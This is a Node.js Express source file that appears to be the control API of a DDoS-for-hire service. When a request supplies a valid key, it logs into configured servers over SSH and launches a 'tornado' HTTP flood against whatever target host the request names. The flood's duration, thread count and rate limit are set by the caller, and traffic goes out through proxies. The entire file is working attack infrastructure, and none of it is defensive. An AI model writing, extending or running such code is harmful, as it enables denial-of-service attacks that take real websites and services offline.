const express = require('express');
const { Client } = require('ssh2');
const app = express();

const VALID_KEYS = ["your keys"];
const SERVERS = [
  {
    host: "your server ip",
    port: 22,
    username: "your server user",
    password: "your server passwd",
    enabled: true
  }
];

app.get('/', (req, res) => {
  const key = req.query.key;
  const host = req.query.host;
  const attack_time = req.query.time;
  const method = req.query.method;
  const settings = req.query.settings;
  const threads = req.query.threads;
  const ratelimit = req.query.ratelimit;

  if (!VALID_KEYS.includes(key)) {
    return res.status(403).json({ error: 'Invalid key' });
  }

  if (method !== 'tornado') {
    return res.status(400).json({ error: 'Invalid method' });
  }

  const settingsCommand = settings ? ` ${settings}` : '';
  const command = `screen -dmS ATTACK node /root/tornado.js GET ${host} ${attack_time} ${threads} ${ratelimit} PROXIESFILE ${settingsCommand}`;
  
  let successful_attacks = 0;
  let error_messages = [];

  SERVERS.forEach(server => {
    if (!server.enabled) {
      console.log(`Skipping disabled server: ${server.host}`);
      return;
    }

    const conn = new Client();
    conn.on('ready', () => {
      console.log(`SSH connection established to ${server.host}`);
      conn.exec(command, (err, stream) => {
        if (err) {
          error_messages.push(`Command execution failed on ${server.host}: ${err.message}`);
          conn.end();
          return;
        }

        stream.on('close', (code, signal) => {
          if (code === 0) {
            console.log(`Command executed successfully on ${server.host}`);
            successful_attacks++;
          } else {
            error_messages.push(`Command execution failed on ${server.host}, exit code: ${code}`);
          }
          conn.end();
        }).on('data', data => {
          console.log(`STDOUT: ${data}`);
        }).stderr.on('data', data => {
          console.error(`STDERR: ${data}`);
        });
      });
    }).on('error', err => {
      console.error(`Error connecting to ${server.host}: ${err.message}`);
      error_messages.push(`Error connecting to ${server.host}: ${err.message}`);
    }).connect({
      host: server.host,
      port: server.port,
      username: server.username,
      password: server.password
    });
  });

  setTimeout(() => {
    if (successful_attacks > 0) {
      res.json({ status: `Attack started on ${successful_attacks} servers` });
    } else {
      res.status(500).json({ error: 'Failed to start attack on any server', details: error_messages });
    }
  }, 5000);
});

app.listen(1488, () => {
  console.log('Server is running on port 1488');
});
